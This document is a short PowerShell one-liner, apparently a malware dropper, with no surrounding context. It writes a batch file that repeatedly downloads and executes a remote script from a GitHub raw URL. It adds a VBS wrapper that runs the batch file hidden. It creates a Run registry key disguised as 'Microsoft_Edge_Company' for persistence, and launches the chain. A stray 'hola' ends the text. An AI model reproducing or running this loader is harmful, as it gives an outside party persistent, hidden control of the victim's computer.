md C:\Users\User\Downloads\ser; $contentToAdd = @"
:a
powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
timeout /t 30
goto a
"@; add-content "C:\Users\User\Downloads\ser/seruex.bat" $contenttoadd; $contentToAdd = @"
set objshell = createobject("wscript.shell")
objshell.run "seruex.bat",vbhide
"@; add-content "C:\Users\User\Downloads\ser/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Users\User\Downloads\ser\seruex.vbs; cd C:\Users\User\Downloads\ser; ./seruex.vbs
"hola"
